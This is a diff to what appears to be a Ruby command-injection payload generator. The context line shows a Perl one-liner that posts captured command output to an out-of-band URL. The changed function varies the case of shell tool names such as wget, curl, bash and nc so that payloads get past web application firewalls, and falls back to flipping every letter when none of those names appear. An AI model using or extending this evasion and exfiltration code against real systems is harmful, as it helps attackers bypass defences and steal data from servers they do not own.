@@ -378,10 +378,25 @@ LWP::UserAgent->new->post('#{oob_url}',Content=>'CMD_OUTPUT:'.$o)
     # WAF Evasion Techniques
 
     def apply_case_variation(payload)
-      # Randomly vary case of commands
-      payload.gsub(/\b(wget|curl|bash|python|perl|nc)\b/i) do |match|
-        match.chars.map { |c| rand(2) == 0 ? c.upcase : c.downcase }.join
+      # Vary case of commands - ensure at least one change is made
+      result = payload.dup
+      changed = false
+      
+      result.gsub!(/\b(wget|curl|bash|python|perl|nc)\b/i) do |match|
+        # Ensure we make a change by alternating case
+        varied = match.chars.map.with_index { |c, i| i.even? ? c.upcase : c.downcase }.join
+        changed = true if varied != match
+        varied
       end
+      
+      # If no commands were found to vary, vary other alphabetic characters
+      unless changed
+        result.gsub!(/[a-zA-Z]/) do |char|
+          char == char.upcase ? char.downcase : char.upcase
+        end
+      end
+      
+      result
     end
 
     def apply_comment_injection(payload)
